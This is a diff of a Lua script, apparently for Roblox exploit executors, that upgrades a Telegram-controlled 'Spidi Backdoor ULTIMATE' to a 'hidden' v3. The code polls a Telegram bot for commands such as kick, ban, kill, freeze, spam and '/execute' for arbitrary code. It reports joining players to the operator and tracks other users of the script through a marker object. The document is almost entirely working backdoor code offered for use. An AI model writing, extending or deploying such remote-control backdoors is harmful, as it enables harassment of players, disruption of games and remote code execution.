@@ -7,18 +7,8 @@
   Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
 
--- ==================== УДАЛЕНИЕ СТАРОГО ФАЙЛА ====================
-local function deleteOldFile()
-    local delfile = syn and syn.delfile or delfile or fluxus and fluxus.delfile
-    if delfile then
-        pcall(delfile, "SpidiBackdoor.lua")
-        print("[Spidi] ✅ Старый файл удалён")
-    end
-end
-deleteOldFile()
-
 print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v2")
+print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v3 (СКРЫТЫЙ)")
 print("[Spidi] ========================================")
 
 repeat wait() until game:IsLoaded()
@@ -68,29 +58,47 @@ local function getChatId()
     return false
 end
 
-local playerList = {}
-local function updatePlayerList()
-    playerList = {}
-    for i, p in pairs(Players:GetPlayers()) do
-        playerList[i] = p
-        playerList[p.Name:lower()] = p
+-- ==================== СПИСОК ИГРОКОВ СКРИПТА ====================
+local scriptUsers = {}
+local function addScriptUser(player)
+    if not scriptUsers[player.UserId] then
+        scriptUsers[player.UserId] = player
+        sendMessage("🟢 <b>"..player.Name.."</b> подключился к Spidi Backdoor!")
     end
 end
 
+local function removeScriptUser(player)
+    if scriptUsers[player.UserId] then
+        scriptUsers[player.UserId] = nil
+        sendMessage("🔴 <b>"..player.Name.."</b> отключился от Spidi Backdoor!")
+    end
+end
+
+-- Текущий игрок использует скрипт
+addScriptUser(Players.LocalPlayer)
+
+-- ==================== ПОИСК ИГРОКА (ТОЛЬКО СРЕДИ ПОЛЬЗОВАТЕЛЕЙ) ====================
 local function findPlayer(input)
     if not input or input == "" then return nil, "❌ Введи ник или номер" end
-    updatePlayerList()
+    
+    -- Собираем список пользователей скрипта
+    local users = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if scriptUsers[p.UserId] then
+            table.insert(users, p)
+        end
+    end
     
     -- Поиск по номеру
     local num = tonumber(input)
-    if num and playerList[num] then
-        return playerList[num]
+    if num and users[num] then
+        return users[num]
     end
     
     -- Поиск по нику (полному или части)
     input = input:lower()
     local matches = {}
-    for _, p in pairs(Players:GetPlayers()) do
+    for _, p in pairs(users) do
         if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
             table.insert(matches, p)
         end
@@ -100,22 +108,67 @@ local function findPlayer(input)
         local names = {}
         for _, p in pairs(matches) do table.insert(names, p.Name) end
         return nil, "Найдено несколько: "..table.concat(names, ", ")
-    else return nil, "Игрок не найден" end
+    else return nil, "Игрок не найден (скрипт не активен у этого игрока)" end
+end
+
+-- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ИГРОКАХ (ТОЛЬКО ПОЛЬЗОВАТЕЛИ) ====================
+local oldPlayers = {}
+local function checkNewPlayers()
+    for _, p in pairs(Players:GetPlayers()) do
+        if not oldPlayers[p.UserId] then
+            -- Проверяем, использует ли игрок скрипт (по наличию переменной)
+            local success, hasScript = pcall(function()
+                return p:FindFirstChild("SpidiUser")
+            end)
+            if success and hasScript then
+                addScriptUser(p)
+            end
+        end
+        oldPlayers[p.UserId] = true
+    end
+end
+
+-- Маркер для скрипта
+local marker = Instance.new("BoolValue")
+marker.Name = "SpidiUser"
+marker.Parent = Players.LocalPlayer
+
+spawn(function()
+    while true do
+        pcall(checkNewPlayers)
+        wait(3)
+    end
+end)
+
+-- ==================== КОМАНДА FREEZE ====================
+local function toggleFreeze(player)
+    local char = player.Character
+    if not char then return end
+    
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not (hrp and hum) then return end
+
+    local state = not hrp.Anchored
+    hrp.Anchored = state
+    hum.WalkSpeed = state and 0 or 16
+    hum.JumpPower = state and 0 or 50
+    return state
 end
 
 local function handleCommand(cmd, args, username)
     print("[Spidi] 📨 /"..cmd.." "..table.concat(args, " "))
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
-    -- ========== БАЗОВЫЕ КОМАНДЫ ==========
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v2 активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v3 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI ULTIMATE v2:</b>\n\n"..
-            "<b>👤 ИГРОКИ:</b>\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI ULTIMATE v3:</b>\n\n"..
+            "<b>👤 ИГРОКИ (только пользователи скрипта):</b>\n"..
+            "/players - список пользователей скрипта\n"..
             "/kick [ник/номер] - кикнуть\n"..
             "/ban [ник/номер] - забанить\n"..
             "/unban [ник/номер] - разбанить\n"..
@@ -151,7 +204,7 @@ local function handleCommand(cmd, args, username)
             "/announce [текст] - объявление\n"..
             "/spam [кол-во] [текст] - спам\n\n"..
             "<b>📊 ИНФО:</b>\n"..
-            "/players - список игроков\n"..
+            "/players - список пользователей скрипта\n"..
             "/server - инфо о сервере\n"..
             "/rejoin - перезайти\n"..
             "/execute [код] - выполнить код\n"..
@@ -161,16 +214,24 @@ local function handleCommand(cmd, args, username)
     
     if cmd == "players" then
         local list = {}
-        for i, p in pairs(Players:GetPlayers()) do
-            table.insert(list, i..". "..p.Name)
+        local i = 1
+        for _, p in pairs(Players:GetPlayers()) do
+            if scriptUsers[p.UserId] then
+                table.insert(list, i..". "..p.Name)
+                i = i + 1
+            end
         end
-        sendMessage("👥 Игроков: "..#list.."\n"..table.concat(list, "\n"))
+        if #list == 0 then
+            sendMessage("👥 Пользователей скрипта: 0")
+        else
+            sendMessage("👥 Пользователей скрипта: "..#list.."\n"..table.concat(list, "\n"))
+        end
         return
     end
     
     if cmd == "server" then
         local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers())
+        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nПользователей скрипта: "..#scriptUsers)
         return
     end
     
@@ -281,21 +342,42 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    if cmd == "kill" and humanoid then
-        humanoid.Health = 0
-        sendMessage("💀 Убит: <b>"..target.Name.."</b>")
+    if cmd == "kill" then
+        if humanoid then
+            humanoid.Health = 0
+            sendMessage("💀 Убит: <b>"..target.Name.."</b>")
+        else
+            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
+        end
         return
     end
     
-    if cmd == "freeze" and humanoid then
-        humanoid.PlatformStand = true
-        sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
+    if cmd == "freeze" then
+        local state = toggleFreeze(target)
+        if state ~= nil then
+            sendMessage("🧊 "..(state and "Заморожен" or "Разморожен")..": <b>"..target.Name.."</b>")
+        else
+            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
+        end
         return
     end
     
-    if cmd == "unfreeze" and humanoid then
-        humanoid.PlatformStand = false
-        sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
+    if cmd == "unfreeze" then
+        local char = target.Character
+        if char then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hrp and hum then
+                hrp.Anchored = false
+                hum.WalkSpeed = 16
+                hum.JumpPower = 50
+                sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
+            else
+                sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
+            end
+        else
+            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
+        end
         return
     end
     
@@ -535,26 +617,6 @@ local function handleCommand(cmd, args, username)
     sendMessage("❌ Неизвестная команда. /help")
 end
 
--- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ИГРОКАХ ====================
-local oldPlayers = {}
-local function checkNewPlayers()
-    local currentPlayers = {}
-    for _, p in pairs(Players:GetPlayers()) do
-        currentPlayers[p.UserId] = p
-        if not oldPlayers[p.UserId] then
-            sendMessage("🟢 <b>"..p.Name.."</b> зашёл в игру!")
-        end
-    end
-    oldPlayers = currentPlayers
-end
-
-spawn(function()
-    while true do
-        pcall(checkNewPlayers)
-        wait(3)
-    end
-end)
-
 -- ==================== ОПРОС TELEGRAM ====================
 local lastId = 0
 local function pollUpdates()
@@ -567,7 +629,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v2 запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v3 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -635,7 +697,7 @@ local function createGUI()
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
-    title.Text = "Spidi Backdoor ULTIMATE"
+    title.Text = "Spidi Backdoor ULTIMATE v3"
     title.TextColor3 = Color3.fromRGB(0, 255, 0)
     title.TextSize = 28
     title.Font = Enum.Font.GothamBold
@@ -723,11 +785,12 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v2 запущен!\n👤 Hacker228\n📋 50+ команд доступно. /help")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v3 запущен!\n👤 Hacker228\n📋 Показываются только пользователи скрипта. /help")
 end
 
 print("[Spidi] ========================================")
 print("[Spidi] ✅ СКРИПТ ЗАПУЩЕН!")
 print("[Spidi] 📌 50+ КОМАНД ДОСТУПНО")
+print("[Spidi] 📌 ПОКАЗЫВАЮТСЯ ТОЛЬКО ПОЛЬЗОВАТЕЛИ СКРИПТА")
 print("[Spidi] 📌 Напиши /help в Telegram")
 print("[Spidi] ========================================")
